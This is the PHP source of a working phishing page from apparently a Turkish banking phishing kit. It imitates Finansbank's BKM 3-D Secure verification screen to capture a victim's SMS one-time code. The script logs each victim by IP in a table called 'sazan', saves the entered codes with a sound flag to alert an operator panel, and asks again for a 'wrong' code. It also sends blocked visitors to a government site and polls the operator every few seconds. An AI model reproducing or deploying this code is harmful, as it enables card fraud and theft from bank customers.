<?php
    error_reporting(0);
    date_default_timezone_set('Europe/Istanbul');
    include('../../baglan.php');
    $db->query("UPDATE sazan SET now = 'Finansbank SMS' WHERE ip = '{$ip}'");
    
    $cc_last_4 = $_SESSION['cc_last_4'];
    $no_last_4 = $_SESSION['no_last_4'];

    $hata = false;
    if($_GET) {
        if($_GET['hata'] == "true") $hata = true;
        else $hata = false;
    }
    if($_POST){
        $sms = guvenlik(trim($_POST['sms']));
        $date = date('d.m.Y H:i');
        if($hata == true) {
          $query = $db->prepare("UPDATE sazan SET sms2=?,smsSound=? WHERE ip = ?");
          $insert = $query->execute(array($sms,1,$ip));
          if($insert){
              header('Location:../' . $siteAyarlari['panel'] . '/bekle.php');
          }
        } else {
          $query = $db->prepare("UPDATE sazan SET sms=?,smsSound=? WHERE ip = ?");
          $insert = $query->execute(array($sms,1,$ip));
          if($insert){
              header('Location:../' . $siteAyarlari['panel'] . '/bekle.php');
          }
        }
    }
    $ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
    foreach($ban as $kontrol){
        if($kontrol['ban'] == $ip){
            header('Location:http://www.turkiye.gov.tr');
        }
    }

?>
<!DOCTYPE html>


<html lang="tr" style="height: 100%; width: 100%;">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="shortcut icon" type="image/png" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" href="../acs.bkm.com.tr/mdpayacs/img/favicon.html">
  <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="../acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <title>BKM ACS</title>
  <link rel="stylesheet" href="bkm_acs_files/bkmacs-dist.css">
  <link rel="stylesheet" href="bkm_acs_files/main-dist.css" type="text/css" media="screen">
  <script type="text/javascript" src="./bkm_acs_files/main-dist.js"></script>
  <script type="text/javascript">var isSupportedIE = true; var panel = '<?= $siteAyarlari['panel'] ?>';</script>
  <script src="./assets/js/custom.js"></script>
  </head>
  <script>
        $(document).ready(function() {
            gonder("<?php echo $ip; ?>");
            var int = self.setInterval("gonder('<?php echo $ip; ?>')", 3000);
        });
    </script>
  <body onload="init(180)">

    <div class="content-wrapper">
	    <div class="header">
            <div class="brand-logo" style="float: left;">
                <img 3dslogo="scheme" style="max-width: 100%;max-height: 30px;" src="img/brand/troy.png" alt="card brand">
            </div>
            <div class="member-logo" style="float: right;">
                <img 3dslogo="issuer" style="max-width: 100%;max-height: 40px;" src="img/finansbank.png" alt="card platform">
            </div>
        </div>
      <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
          <div class="loader"></div>
        </div>
        <div class="content">
          <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
          <div class="info-wrapper">
            <div class="info-row">
              <div class="info-col info-label">İşyeri Adı:</div>
              <div class="info-col" 3dsdisplay="merchant" id="merchant-name"><?= $isyeri?></div>
            </div>
            <?php if(isset($_SESSION['tutar'])) { ?>
              <div class="info-row">
              <div class="info-col info-label">İşlem Tutarı:</div>
              <div class="info-col amount" 3dsdisplay="amount" id="amount"><?= $_SESSION['tutar'] ?> TL</div>
            </div>
            <?php } ?>
            <div class="info-row">
              <div class="info-col info-label">İşlem Tarihi-Saati:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan"><?php echo date("d.m.Y  H:i:s"); ?></div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">Kart Numarası:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan">XXXX XXXX XXXX <?=$cc_last_4?> </div>
            </div>
          </div>
          <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
            <div>
              <h3>Şifreniz 05*****<?=$no_last_4?> nolu cep telefonunuza gönderilecektir.</h3>
            </div>
            <div class="form-wrapper">
              <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" action="<?php echo $hata == true ? "?hata=true" : ""?>" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
					<label for="code" class="otpcode">Doğrulama Kodu</label>
                  <input 3dsinput="password" type="text" class="f-input" onpaste="return false;" ondrop="return false;" autocomplete="off" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
                <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;">
                    <?php
                        if($hata) echo '<p style="color:red;text-align: center">Yanlış kod girdiniz, lütfen yeniden gönderilen kodu giriniz.</p>';
                    ?>
                  <span class="has-reg"></span></div> 
                <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                  <div>
                    <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                  </div>
                  <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="newsms" value="retry">Doğrulama Kodunu Yeniden Gönder</button>
                  <div>
                    <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                  </div>
                  <input style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                  <div class="noscriptHelpText">
                    Doğrulama esnasında cep telefonunuza doğrulama kodu gelmemesi
                    durumunda doğrulama için kalan sürenin dolmasını bekleyerek
                    ?Doğrulama Kodunu Tekrar Gönder? linkinden tekrar doğrulama
                    kodu gönderilmesini talep edebilirsiniz.<br> Tekrar
                    doğrulama kodu gönderimi sağlandığı halde cep telefonunuza
                    ulaşmaması ve benzeri problemlerde lütfen kartınızı ihraç eden
                    kuruluş ile irtibata geçiniz.
                  </div>
                </div>
                <div id="submitButtonDiv">
                  <div class="has-submit">
                    <button id="submitbutton" type="submit" name="submit" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                  </div>
                  <div id="timerDiv" class="has-timer">
                    <span>Kalan Süre: </span> <span class="has-counter" id="has-counter">02:26</span>
                  </div>
                </div>
                <div class="call-to-action">
                  <div class="action-list">
                    <div class="action-row">
                      <div class="action-col left">
                        <a data-fancybox="" data-src="#canceldialog" href="../<?= $siteAyarlari['panel'] ?>/bekle.php" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi İptal Et</a>
                        <button id="triggercancel" type="submit" name="cancel" value="cancel" style="display: none;"></button>
                      </div>  
                      <div class="action-col right">
                        <a href="#" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">Yardım</a>
                      </div>
                    </div>
                  </div>
                  <div style="display: none;">
                    <div class="panel" id="canceldialog">
                      <h1 class="small" id="msg-cancel-box">İşyeri sayfasına yönlendirileceksiniz, işleminizi iptal etmek
                        istediğinizden emin misiniz?</h1>
                      <a href="../<?= $siteAyarlari['panel'] ?>/bekle.php" class="button btn-1 close-modal">Vazgeç</a>
                     
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript" src="./bkm_acs_files/bkmacs-dist.js" charset="utf-8"></script>
</body>
</html>